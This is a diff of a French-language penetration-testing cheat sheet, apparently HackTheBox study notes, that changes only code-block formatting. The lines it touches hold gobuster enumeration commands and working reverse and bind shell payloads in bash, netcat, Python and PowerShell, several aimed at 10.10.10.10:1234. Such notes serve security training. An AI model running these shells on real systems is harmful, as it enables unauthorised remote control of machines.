@@ -232,11 +232,8 @@ Gobuster est un outil de découverte de contenu et de répertoire utilisé pour 
 
     Exemple :
 
-    {% code overflow="wrap" %}
-    ```bash
-    gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
+    </code></pre>
 *   <mark style="color:orange;">**Utilisation de Threads**</mark>
 
     ```bash
@@ -245,11 +242,8 @@ Gobuster est un outil de découverte de contenu et de répertoire utilisé pour 
 
     Exemple :
 
-    {% code overflow="wrap" %}
-    ```bash
-    gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+    </code></pre>
 *   <mark style="color:orange;">**Énumération de Sous-Domaines**</mark>
 
     ```bash
@@ -258,11 +252,8 @@ Gobuster est un outil de découverte de contenu et de répertoire utilisé pour 
 
     Exemple :
 
-    {% code overflow="wrap" %}
-    ```bash
-    gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+    </code></pre>
 *   <mark style="color:orange;">**Recherche de Vhosts**</mark>
 
     ```bash
@@ -271,11 +262,8 @@ Gobuster est un outil de découverte de contenu et de répertoire utilisé pour 
 
     Exemple :
 
-    {% code overflow="wrap" %}
-    ```bash
-    gobuster vhost -u https://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster vhost -u https://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+    </code></pre>
 
 #### <mark style="color:green;">Interprétation des Codes d'État HTTP</mark>
 
@@ -541,24 +529,19 @@ meterpreter > shell
 3. **Commande de Reverse Shell :**
    *   <mark style="color:orange;">**Linux (bash) :**</mark>
 
-       {% code title="COMMANDE LINUX" overflow="wrap" lineNumbers="true" fullWidth="true" %}
-       ```bash
-       bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
-       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
-       ```
-       {% endcode %}
+       <pre class="language-bash" data-title="COMMANDE LINUX" data-overflow="wrap" data-line-numbers data-full-width="true"><code class="lang-bash">bash -c 'bash -i >&#x26; /dev/tcp/10.10.10.10/1234 0>&#x26;1'
+       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 10.10.10.10 1234 >/tmp/f
+       </code></pre>
    *   <mark style="color:orange;">**Windows (Powershell)**</mark>&#x20;
 
-       {% code overflow="wrap" lineNumbers="true" %}
-       ```powershell
-       powershell -nop -c "
+       <pre class="language-powershell" data-overflow="wrap" data-line-numbers><code class="lang-powershell">powershell -nop -c "
        $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1234);
        $s = $client.GetStream();
        [byte[]]$b = 0..65535 | %{ 0 };
 
        while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i);
-           $sb = (iex $data 2>&1 | Out-String);
+           $sb = (iex $data 2>&#x26;1 | Out-String);
            $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
            $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
            $s.Write($sbt, 0, $sbt.Length);
@@ -568,8 +551,7 @@ meterpreter > shell
        $client.Close();
        "
 
-       ```
-       {% endcode %}
+       </code></pre>
 4.  **Recevoir la connexion dans Netcat :**
 
     ```bash
@@ -639,16 +621,11 @@ $client.Close();
 1. **Commande de Bind Shell :**
    *   **Linux (bash)**&#x20;
 
-       {% code title="Bind shell" lineNumbers="true" fullWidth="true" %}
-       ```bash
-       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
-       ```
-       {% endcode %}
+       <pre class="language-bash" data-title="Bind shell" data-line-numbers data-full-width="true"><code class="lang-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&#x26;1|nc -lvp 1234 >/tmp/f
+       </code></pre>
    *   **Python :**
 
-       {% code overflow="wrap" lineNumbers="true" %}
-       ```python
-       python -c 'exec("""
+       <pre class="language-python" data-overflow="wrap" data-line-numbers><code class="lang-python">python -c 'exec("""
        import socket as s
        import subprocess as sp
 
@@ -664,13 +641,10 @@ $client.Close();
            c.sendall(p.stdout.read() + p.stderr.read())
        """)'
 
-       ```
-       {% endcode %}
+       </code></pre>
    *   **Windows (Powershell) :**
 
-       {% code overflow="wrap" %}
-       ```powershell
-       powershell -NoP -NonI -W Hidden -Exec Bypass -Command {
+       <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell -NoP -NonI -W Hidden -Exec Bypass -Command {
            $listener = [System.Net.Sockets.TcpListener]1234
            $listener.Start()
            $client = $listener.AcceptTcpClient()
@@ -679,7 +653,7 @@ $client.Close();
 
            while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-               $sendback = (iex $data 2>&1 | Out-String)
+               $sendback = (iex $data 2>&#x26;1 | Out-String)
                $sendback2 = $sendback + "PS " + (pwd).Path + " "
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
@@ -689,8 +663,7 @@ $client.Close();
            $client.Close()
        }
 
-       ```
-       {% endcode %}
+       </code></pre>
 2.  **Connexion avec Netcat :**
 
     ```bash
@@ -962,11 +935,8 @@ Lorsqu'on se connecte à un shell via Netcat, nous avons accès à un shell limi
 
 *   Transférer un fichier avec scp en utilisant des identifiants ssh :
 
-    {% code title="SCP" overflow="wrap" lineNumbers="true" fullWidth="true" %}
-    ```bash
-    mrroboteLiot@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-title="SCP" data-overflow="wrap" data-line-numbers data-full-width="true"><code class="lang-bash">mrroboteLiot@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
+    </code></pre>
 
 #### <mark style="color:green;">**3. Utilisation de Base64**</mark>
 
